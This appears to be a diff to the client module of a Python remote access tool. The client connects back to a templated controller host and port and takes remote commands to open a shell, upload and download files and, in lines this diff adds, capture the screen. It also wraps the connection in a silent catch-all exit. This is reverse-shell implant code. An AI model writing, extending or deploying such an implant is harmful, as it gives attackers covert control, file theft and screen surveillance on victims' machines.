@@ -4,30 +4,36 @@
 # @Software: PyCharm
 # @Time    : 2020/8/15 17:17
 
+import os
 import socket
-import subprocess
+from lib.dsSocket import *
+from clientModule.screen import Screen
 from clientModule.shell import Shell
-from misc.encoding import Encode
 from clientModule.fileOperation import FileOPT
 
-if __name__ == "__main__":
+def connect():
     host = "$HOST$"
     port = "$PORT$"
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((host, port))
-    p = subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
     shell = Shell(client)
     while True:
-        cmd = client.recv(8192).decode(Encode.encoding)
+        cmd = DShellRecv(client)
         if cmd == "shell":
-            while True:
-                if not shell.shell():
-                    break
+            shell.shell()
         elif cmd[:6] == "upload":
             FileOPT(client, cmd).upload()
         elif cmd[:8] == "download":
             FileOPT(client, cmd).download()
+        elif cmd == "screen":
+            Screen(client)
         elif cmd in ["quit", "q", "exit"]:
             break
     client.shutdown(2)
     client.close()
+
+if __name__ == "__main__":
+    try:
+        connect()
+    except:
+        os._exit(0)
